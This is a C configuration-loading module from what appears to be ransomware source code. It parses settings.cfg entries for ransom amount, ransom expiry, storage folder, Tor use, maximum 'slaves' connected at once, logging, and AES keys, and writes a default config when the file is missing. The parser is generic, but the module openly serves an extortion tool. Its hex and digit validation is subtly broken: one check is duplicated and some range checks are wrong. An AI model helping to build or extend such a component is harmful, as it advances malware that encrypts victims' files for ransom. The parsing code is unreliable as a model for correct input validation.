#include <console.h>
#include <config.h>
#include <memory.h>
#include <aes.h>

/*
    TODO: add float
*/

#if SCFG_CORE_CONFIG_DEBUG_PATH == ON
    #define CONFIG_PATH_A  "source/settings.cfg"
    #define CONFIG_PATH_W L"source/settings.cfg"
#else
    #define CONFIG_PATH_A  "settings.cfg"
    #define CONFIG_PATH_W L"settings.cfg"
#endif

CONFIG Config;

typedef enum _PROPTYPE {
    PROPERTIE_TYPE_BOOL   = 0,
    PROPERTIE_TYPE_STRING = 1,
    PROPERTIE_TYPE_ULONG  = 2,
    PROPERTIE_TYPE_BINARY = 3,
} PROPTYPE, *PPROPTYPE;

typedef enum _PROPGETERROR {
    PROPERTIE_GET_ERROR_SUCCESS        = 0,
    PROPERTIE_GET_ERROR_INVALID_VALUE  = 1,
    PROPERTIE_GET_ERROR_SIZE_NOT_VALID = 2,
    PROPERTIE_GET_ERROR_SIZE_TO_LARGE  = 3,
} PROPGETERROR, *PPROPGETERROR;

typedef struct _PROPERTIE {
    PROPTYPE Type;
    PSTR     szPropertieName;
    SIZE_T   cbPropertieName;
    PVOID    Output;
    PSIZE_T  OutputSize;
    SIZE_T   OutputMaxSize;
    SIZE_T   OutputFixedSize;
} PROPERTIE, *PPROPERTIE;

#define CREATE_PROP(TYPE, NAME, OUTPUT, OUTPUT_SIZE, MAX_SIZE, FIXED_SIZE) \
    {                                                                      \
        TYPE,                                                              \
        NAME,                                                              \
        sizeof(NAME) - sizeof(NAME[0]),                                    \
        OUTPUT,                                                            \
        OUTPUT_SIZE,                                                       \
        MAX_SIZE,                                                          \
        FIXED_SIZE                                                         \
    }

static CONST PROPERTIE Propertie[] = {
    CREATE_PROP(PROPERTIE_TYPE_STRING, "RANSOMSTORAGEFOLDER",             &Config.Ransom.szStoragePath,               NULL, MAX_PATH,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "RANSOMEXPIRESAFTER",              &Config.Ransom.dwExpireTime,                NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "RANSOMMONEYWANTED",               &Config.Ransom.dwMoneyWanted,               NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "RANSOMCHECKEXPIRATIONSDATEAFTER", &Config.Ransom.dwCheckExpirationsDateAfter, NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_BOOL,   "NETUSETOR",                       &Config.Network.bUseTor,                    NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "NETPORT",                         &Config.Network.dwPort,                     NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "NETTHREADS",                      &Config.Network.dwThreads,                  NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "NETMAXSLAVESATONCE",              &Config.Network.dwMaxConnectionActive,      NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_BOOL,   "ENABLELOG",                       &Config.Log.bEnabled,                       NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_STRING, "LOGGERPATHDIRECTORY",             &Config.Log.szLogPath,                      NULL, MAX_PATH,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "MAXSIZEPERLOG",                   &Config.Log.dwMaxLogSize,                   NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_ULONG,  "AESKEYGENALGORITHM",              &Config.Aes.KeyGenAlgorithm,                NULL,        0,           0),
    CREATE_PROP(PROPERTIE_TYPE_BINARY, "AESKEY",                          &Config.Aes.Key,                            NULL,        0, AES_KEY_SIZE),
    CREATE_PROP(PROPERTIE_TYPE_BINARY, "AESKEYSALTH",                     &Config.Aes.KeyIv,                          NULL,        0, AES_KEY_SIZE)
};

#undef CREATE_PROP

static CONST PSTR szPropertieTypeStrings[] = {
    "Boolean",
    "String",
    "Integer",
    "Binary"
};

static
PROPGETERROR
PropertieValueBool(
    IN PSTR  szValue,
    IN ULONG dwIndex
    )
{
    RtlpStringToUppercase(szValue);

    if (RtlpStringCompareNZ(szValue, "TRUE", 4)) {
        *((PBOOL)Propertie[dwIndex].Output) = TRUE;
    } else if (RtlpStringCompareNZ(szValue, "FALSE", 4)) {
        *((PBOOL)Propertie[dwIndex].Output) = FALSE;
    } else {
        return PROPERTIE_GET_ERROR_INVALID_VALUE;
    }

    return PROPERTIE_GET_ERROR_SUCCESS;
}

static
PROPGETERROR
PropertieValueString(
    IN PSTR  szValue,
    IN ULONG dwIndex
    )
{
    ULONG cbValue = RtlpStringCount(szValue);

    if (Propertie[dwIndex].OutputFixedSize && cbValue != Propertie[dwIndex].OutputFixedSize) {
        return PROPERTIE_GET_ERROR_SIZE_NOT_VALID;
    }

    if (Propertie[dwIndex].OutputMaxSize && cbValue > Propertie[dwIndex].OutputMaxSize) {
        return PROPERTIE_GET_ERROR_SIZE_TO_LARGE;
    }

    if (cbValue) {
        PBYTE sBuffer = MmAlloc(cbValue);

        RtlpCopyMemoryInstr(sBuffer, szValue, cbValue);

        *((PULONG_PTR)Propertie[dwIndex].Output) = (ULONG_PTR)sBuffer;

        if (NOT_NULL(Propertie[dwIndex].OutputSize)) {
            *Propertie[dwIndex].OutputSize = cbValue;
        }
    }

    return PROPERTIE_GET_ERROR_SUCCESS;
}

static
PROPGETERROR
PropertieValueUlong(
    IN PSTR  szValue,
    IN ULONG dwIndex
    )
{
    ULONG dwValue = 0;

    while (*szValue) {
        if ((ULONG)*szValue - '0' > 10) {
            return PROPERTIE_GET_ERROR_INVALID_VALUE;
        }

        dwValue = dwValue * 10 + *szValue++ - '0';
    }

    *((PULONG)Propertie[dwIndex].Output) = dwValue;

    return PROPERTIE_GET_ERROR_SUCCESS;
}

static
PROPGETERROR
PropertieValueBinary(
    IN PSTR  szValue,
    IN ULONG dwIndex
    )
{
    SIZE_T cbValue = RtlpStringCount(szValue);
       
    if (cbValue > 1) {
        PBYTE sBuffer = MmAlloc(cbValue / 2 + cbValue % 2);
        PSTR szValueEnd = szValue + cbValue;

        *((PULONG_PTR)Propertie[dwIndex].Output) = (ULONG_PTR)sBuffer;

        while (szValue != szValueEnd) {
            if (*szValue == ' ') {
                szValue++;
                continue;
            }

            ULONG dwSubValue1;
            ULONG dwSubValue2;

            dwSubValue1 = (ULONG)*szValue - '0' <= 0xA ? *szValue - '0'       : 0xFFFFFFFF;
            dwSubValue1 = (ULONG)*szValue - 'a' <= 0xF ? *szValue - 'a' + 0xA : dwSubValue1;
            dwSubValue1 = (ULONG)*szValue - 'A' <= 0xF ? *szValue - 'A' + 0xA : dwSubValue1;
            szValue++;

            if (szValue != szValueEnd) {
                dwSubValue2 = (ULONG)*szValue - '0' <= 0xA ? *szValue - '0'       : 0xFFFFFFFF;
                dwSubValue2 = (ULONG)*szValue - 'a' <= 0xF ? *szValue - 'a' + 0xA : dwSubValue2;
                dwSubValue2 = (ULONG)*szValue - 'A' <= 0xF ? *szValue - 'A' + 0xA : dwSubValue2;
                szValue++;
            } else {
                dwSubValue2 = 0;
            }

            if (dwSubValue1 == 0xFFFFFFFF || dwSubValue1 == 0xFFFFFFFF) {
                return PROPERTIE_GET_ERROR_INVALID_VALUE;
            }

            *sBuffer++ = dwSubValue2 | dwSubValue1 << 4;
        }

        {
            cbValue = (ULONG_PTR)sBuffer - *((PULONG_PTR)Propertie[dwIndex].Output);

            if (Propertie[dwIndex].OutputFixedSize && cbValue != Propertie[dwIndex].OutputFixedSize) {
                return PROPERTIE_GET_ERROR_SIZE_NOT_VALID;
            }

            if (Propertie[dwIndex].OutputMaxSize && cbValue > Propertie[dwIndex].OutputMaxSize) {
                return PROPERTIE_GET_ERROR_SIZE_TO_LARGE;
            }

            if (NOT_NULL(Propertie[dwIndex].OutputSize)) {
                *Propertie[dwIndex].OutputSize = cbValue;
            }
        };

        return PROPERTIE_GET_ERROR_SUCCESS;
    }

    return PROPERTIE_GET_ERROR_INVALID_VALUE;
}

typedef PROPGETERROR ( * PROPERTIEVALUE)(
    IN PSTR  szValue,
    IN ULONG dwIndex
    );

static PROPERTIEVALUE PropertieValue[] = {
    PropertieValueBool,   // 0
    PropertieValueString, // 1
    PropertieValueUlong,  // 2
    PropertieValueBinary  // 3
};

static
BOOL
PropertieHandle(
    IN ULONG dwLineNumber,
    IN PSTR  szName,
    IN ULONG cbName,
    IN PSTR  szValue
    )
{
    RtlpStringToUppercase(szName);

    for (ULONG_PTR i = 0; i != ARRAYSIZE(Propertie); i++) {
        if (Propertie[i].cbPropertieName == cbName && RtlpStringCompareNZ(szName, Propertie[i].szPropertieName, Propertie[i].cbPropertieName)) {
            PROPGETERROR Error = PropertieValue[Propertie[i].Type](szValue, i);

            if (Error != PROPERTIE_GET_ERROR_SUCCESS) {
                if (Error == PROPERTIE_GET_ERROR_INVALID_VALUE) {
                    ConsolePrint("Invalid value on line %lu! Expected %s\n", dwLineNumber, szPropertieTypeStrings[Propertie[i].Type]);
                } else if (Error == PROPERTIE_GET_ERROR_SIZE_NOT_VALID) {
                    ConsolePrint("Invalid value size on line %lu! Must be exactly %lu characters\n", dwLineNumber, Propertie[i].OutputFixedSize);
                } else if (Error == PROPERTIE_GET_ERROR_SIZE_TO_LARGE) {
                    ConsolePrint("Invalid value size on line %lu! Must be smaller than %lu characters\n", dwLineNumber, Propertie[i].OutputMaxSize);
                }
                
                return FALSE;
            }

            return TRUE;
        }
    }

    ConsolePrint("Unknow propertie \"%s = %s\" on line %lu\n", szName, szValue, dwLineNumber);

    return FALSE;
}

static
VOID
CreateDefaultConfig(VOID)
{
    CONST CHAR szDefaultSettings[] = {
        "# Time is messured in minutes\n"
        "\n"
        "RansomStorageFolder=.\\\n"
        "RansomExpiresAfter=28800\n"
        "# Still thinking best way to make this RansomMoneyWanted"
        "RansomMoneyWanted=0\n"
        "RansomCheckExpirationsDateAfter=60\n"
        "\n"
        "NetUseTor=FALSE\n"
        "NetPort=80\n"
        "NetThreads=3\n"
        "NetMaxSlavesAtOnce=10\n"
        "\n"
        "EnableLog=FALSE\n"
        "LoggerPathDirectory=.\\\n"
        "MaxSizePerLog=1024\n"
        "\n"
        "AesKeyGenAlgorithm=0\n"
        "AesKey=000102030405060708090A0B0C0D0E0F\n"
        "AesKeySalth=000102030405060708090A0B0C0D0E0F\n"
    };

    ULONG dwReserved;
    HANDLE hFile = CreateFileW(CONFIG_PATH_W, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (IS_INVALID_HANDLE(hFile)) {
        ConsolePrint("Failed to create " CONFIG_PATH_A "\n");

        return;
    }

    if (!WriteFile(hFile, szDefaultSettings, sizeof(szDefaultSettings) - 1, &dwReserved, NULL)) {
        ConsolePrint("Failed to write to " CONFIG_PATH_A "\n");

        return;
    }

    CloseHandle(hFile);
}

BOOL
InitConfig(VOID)
{
    RtlpZeroObjectInline(Config);

    DWORD cbContent;
    BOOL  bCreateNew = FALSE;
    HANDLE hFile = CreateFileW(CONFIG_PATH_W, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (IS_INVALID_HANDLE(hFile)) {
        ConsolePrint(CONFIG_PATH_A " is missing! Creating new one...\n");
        bCreateNew = TRUE;
    } else if (!(cbContent = GetFileSize(hFile, NULL))) {
        ConsolePrint(CONFIG_PATH_A " is empty! Creating new one...\n");
        bCreateNew = TRUE;
    }

    if (bCreateNew) {
        CreateDefaultConfig();
        ExitProcess(0);
    }

    PVOID Content = MmAlloc(cbContent);

    if (!ReadFile(hFile, Content, cbContent, &cbContent, NULL)) {
        ConsolePrint("Couldn't retrvice settings.cfg content\n");

        return FALSE;
    }

    PSTR sContent = Content;
    PSTR sContentEnd = (PVOID)((ULONG_PTR)Content + cbContent);
    ULONG dwLineNumber = 0;

    while (sContent != sContentEnd && *sContent) {
        if (*sContent == '\n') {
            dwLineNumber++;
            sContent++;

            continue;
        }

        if (*sContent == '\r') {
            sContent++;

            continue;
        }

        PSTR szLine = sContent;
        dwLineNumber++;

        while (sContent != sContentEnd) {
            if (*sContent == '\n') {
                *sContent++ = 0;

                break;
            } else if (*sContent == '\r') {
                *sContent++ = 0;

                if (sContent != sContentEnd) {
                    sContent++;
                }

                break;
            }

            sContent++;
        }

        if (*szLine == '#') {
            continue;
        }

        while (*szLine == ' ') { szLine++; }

        if (*szLine == '=') {
            ConsolePrint("Syntax error on line %lu\n", dwLineNumber);

            return FALSE;
        }

        PSTR szPropName = szLine;
        ULONG cbPropName;

        while (*szLine != ' ' && *szLine != '=') { szLine++; }
        cbPropName = szLine - szPropName;
        *szLine++ = 0;
        while (*szLine == ' ' || *szLine == '=') { szLine++; };

        if (!*szLine) {
            ConsolePrint("Syntax error on line %lu\n", dwLineNumber);

            return FALSE;
        }

        if (!PropertieHandle(dwLineNumber, szPropName, cbPropName, szLine)) {
            return FALSE;
        }
    }

    MmFree(Content);
    CloseHandle(hFile);

    return TRUE;
}
